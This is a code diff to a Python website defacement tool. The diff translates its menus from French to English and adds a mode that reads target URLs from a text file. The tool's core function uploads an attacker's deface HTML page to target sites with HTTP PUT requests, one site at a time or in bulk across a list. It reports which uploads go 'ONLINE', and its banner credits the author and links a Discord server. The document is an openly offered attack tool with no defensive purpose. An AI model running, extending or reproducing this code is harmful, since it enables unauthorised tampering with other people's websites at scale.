@@ -2,30 +2,25 @@
 
 import requests
 import os.path
-import sys
-import os
 import random
-import re
 from urllib.parse import urlparse
 from bs4 import BeautifulSoup
 
 try:
     import requests
     import os.path
-    import sys
-    import os
     import random
     from bs4 import BeautifulSoup
 except ImportError:
-    exit("installez requests, beautifulsoup4 et réessayez ...")
+    exit("Install requests, beautifulsoup4 and try again...")
 
 os.system("clear")
 
-red    = "\033[31m"
-blue   = "\033[34m"
-bold   = "\033[1m"
-reset  = "\033[0m"
-green  = "\033[32m"
+red = "\033[31m"
+blue = "\033[34m"
+bold = "\033[1m"
+reset = "\033[0m"
+green = "\033[32m"
 yellow = "\033[33m"
 
 colors = [
@@ -53,7 +48,7 @@ banner = """
  
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 
-    [⍟] Auteur de l'outil: O&N
+    [⍟] Tool Author: O&N
 
     [⍟] Discord: https://discord.gg/teHyE9Tgq7\t
    
@@ -64,6 +59,7 @@ banner = """
 b = '\033[31m'
 h = '\033[32m'
 m = '\033[00m'
+
 
 def x(tetew):
     ipt = input(tetew)
@@ -78,11 +74,11 @@ def aox(script, target_url):
             site = "http://" + site
         req = s.put(site + "/" + script, data=op)
         if req.status_code > 200 or req.status_code >= 250:
-            print(m + ">" + b + "[+] ÉCHEC" + b + " %s/%s" % (site, script))
+            print(m + ">" + b + "[+] FAILED" + b + " %s/%s" % (site, script))
         else:
-            print(m + ">" + h + "[+] EN LIGNE" + h + " %s/%s" % (site, script))
+            print(m + ">" + h + "[+] ONLINE" + h + " %s/%s" % (site, script))
     except requests.exceptions.RequestException:
-        print(m + ">" + b + "[+] ÉCHEC" + b + " %s" % target_url)
+        print(m + ">" + b + "[+] FAILED" + b + " %s" % target_url)
 
 def find_links(html_content):
     soup = BeautifulSoup(html_content, 'html.parser')
@@ -107,51 +103,59 @@ def crawl_and_deface(site_url, deface_file):
     except requests.exceptions.RequestException as e:
         print("An error occurred:", e)
 
+def read_links_from_file(file_path):
+    try:
+        with open(file_path, "r") as file:
+            links = [line.strip() for line in file.readlines()]
+            return links
+    except FileNotFoundError:
+        print(f"File '{file_path}' not found.")
+        return []
+
+def crawl_and_deface_links_from_file(deface_file, links_file):
+    links = read_links_from_file(links_file)
+    if not links:
+        return
+
+    for link in links:
+        aox(deface_file, link)
+
 def main(__bn__):
     print(__bn__)
     while True:
         try:
-            choice = x("Choisissez une option:\n1. Défacer un seul site\n2. Crawler et défacer les liens d'un site\n3. Quitter\n")
+            choice = x("Choose an option:\n1. Deface a single site\n2. Crawl and deface links from a file\n3. Quit\n")
             if choice == "1":
                 deface_single_site()
             elif choice == "2":
                 crawl_and_deface_links()
             elif choice == "3":
-                print("Au revoir!")
+                print("Goodbye!")
                 exit()
             else:
-                print("Option invalide, veuillez réessayer.")
+                print("Invalid option, please try again.")
         except KeyboardInterrupt:
-            print("\nOpération annulée.")
+            print("\nOperation cancelled.")
 
 def deface_single_site():
     try:
-        a = x(f"Entrez votre fichier .html de déface: ")
+        a = x(f"Enter your deface .html file: ")
         if not os.path.isfile(a):
-            print("Fichier '%s' introuvable" % a)
+            print("File '%s' not found" % a)
             return
-        target_url = x(f"Entrez l'URL du site cible: ")
+        target_url = x(f"Enter the target site URL: ")
         aox(a, target_url)
     except KeyboardInterrupt:
         print()
 
 def crawl_and_deface_links():
     try:
-        a = x(f"Enter the path of your .html defacement file: ")
+        a = x(f"Enter your deface .html file: ")
         if not os.path.isfile(a):
             print("File '%s' not found" % a)
             return
-
-        link_file = x(f"Enter the path of the .txt file containing URLs: ")
-        if not os.path.isfile(link_file):
-            print("File '%s' not found" % link_file)
-            return
-
-        with open(link_file, 'r') as f:
-            target_urls = f.read().splitlines()
-
-        for target_url in target_urls:
-            crawl_and_deface(target_url, a)
+        links_file = x(f"Enter the path to the .txt file containing links: ")
+        crawl_and_deface_links_from_file(a, links_file)
     except KeyboardInterrupt:
         print()
 
